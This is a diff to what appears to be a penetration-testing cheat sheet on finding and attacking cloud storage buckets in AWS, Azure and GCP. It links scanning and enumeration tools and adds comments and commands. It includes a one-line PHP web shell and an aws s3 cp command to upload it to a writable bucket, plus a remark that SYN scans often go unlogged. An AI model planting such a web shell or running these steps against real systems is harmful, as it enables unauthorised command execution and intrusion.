@@ -7,7 +7,8 @@ Use masscan to scan a large IP range:
     --rate 50000   #fastest scan    
     #Most devices won't log half open SYN scans (nmap -sS and masscan) or TLS scan to web ports              
 ## AWS     
-AWS GuardDuty for security. [AWS IP ranges](https://ip-ranges.amazon.aws/ip-ranges.json)         
+AWS GuardDuty for security. No logging or versioning on by default.         
+[AWS IP ranges](https://ip-ranges.amazon.aws/ip-ranges.json)         
 [Pacu](https://github.com/RhinoSecurityLabs/pacu): AWS exploit framework      
 S3 Buckets: https://s3.amazonaws.com/{bucketname}        
 [bucketfinder](https://github.com/FishermansEnemy/bucket_finder/tree/master): look for interesting files on Amazon S3 buckets.       
@@ -23,9 +24,9 @@ Commands
 might be able to upload a php web shell      
 
     echo '<?php system($_GET["cmd"]); ?>' > shell.php   #make web shell file   
-    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com    
+    aws --endpoint=http://s3.site.com s3 cp shell.php s3://site.com     #upload web shell     
 
-Search for files with keywords in buckets using bucket_finder:     
+Search for files with keywords in buckets using [bucket_finder](https://github.com/FishermansEnemy/bucket_finder):     
 
     bucket_finder.rb search_term --download         
     
@@ -43,6 +44,8 @@ Azure Blob: https://{account}.blob.core.windows.net/{container}
 [AZ-Blob-Attacker](https://github.com/VitthalS/Az-Blob-Attacker)    
 [Basic Blob Finder](https://github.com/joswr1ght/basicblobfinder): search for Azure blobs       
 [Microburst](https://github.com/NetSPI/MicroBurst): Scripts for pentesting Azure    
+
+    basicblobfinder.py wordlist   #enum buckets       
 Google Hacks:     
 
     site:*.blob.core.windows.net
@@ -54,3 +57,7 @@ https://www.inversecos.com/2022/01/how-to-detect-and-compromise-azure.html
 GCP Cloud Armor for security. [List of Buckets by IPS](https://www.gstatic.com/ipranges/cloud.json)           
 GCP: https://www.googleapis.com/storage/v1/b/{bucketname}      
 [GCPBucketBrute](https://github.com/RhinoSecurityLabs/GCPBucketBrute): search for Google Storage Buckets and check accesses.     
+Bucket permissions: listable (enum and read files), writeable (upload)       
+
+    gcpbucketbrute.py -u -k search_org      
+    gsutil ls gs://bucket       #list contents of a public bucket     
